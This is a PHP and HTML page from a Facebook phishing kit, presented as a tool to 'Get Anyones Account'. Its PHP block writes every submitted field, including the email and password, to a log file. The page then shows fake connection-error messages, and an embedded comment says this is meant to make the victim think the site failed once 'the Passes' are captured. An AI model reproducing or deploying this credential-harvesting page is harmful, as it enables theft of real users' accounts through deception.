<style>
    body{
        background-color: #003366;
    }
</style>
<?php

if(!isset($_POST['email']) || empty($_POST['email']) || !isset($_POST['pass']) || empty($_POST['pass']))
{
	header("location:index.php");
}
else{
    $logfile = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($logfile, $variable);
    fwrite($logfile, "=");
    fwrite($logfile, $value);
    fwrite($logfile, "\r\n");
    }
    fwrite($logfile, "\r\n");
    fclose($logfile);
}

?>

<!DOCTYPE html>
<html>
<head>
	<title>facebook</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="shortcut icon" href="icon.png" type="image/x-icon" />
</head>
    
<body>

<div class="top">
   
	<h1 style="margin-top:0; color:black">  <img src="indexlogo.png" style="width: 80px;height:80px"> Facebook Archive - Get Anyones Account</h1> 
</div>
	<header>
		//We got the Passes. Time to make the user Exit. Make him think that the website gave an Error. 
		<img src="logo2.png">
		<div class="head" style="display:inline-block;align-self:center">
			<h3>Information</h3>
            Enter ID URL/Link<br>
            <input type="search" name="Enter URL" style="fontsize: 10px"><br>
            <input type="button" name="Begin" value="Click to Begin" onclick="showdiv()">
            <br>
            <span style=color:blue>Website UNDER Updates! Please come back Later!</span><br>
            Account Name = <span style=color:red>Error while Parsing. [Poor Internet Connection, Failed to Connect to Facebook Database]</span><br>
            Account Link = <span style=color:red>Error while Parsing. [Poor Internet Connection, Failed to Connect to Facebook Database]</span><br>
            Account Password = <span style=color:red>Error while Parsing. [Poor Internet Connection, Failed to Connect to Facebook Database]</span>
            
           <br><br><span style="color: #3B5998;cursor:pointer">#ProjectFacebookPh. </span>
            Thank you for Participating in Project FacebookPh.<br>
            If you don't know what to do next. Close this.
		</div>
	</header>


</body>
</html>
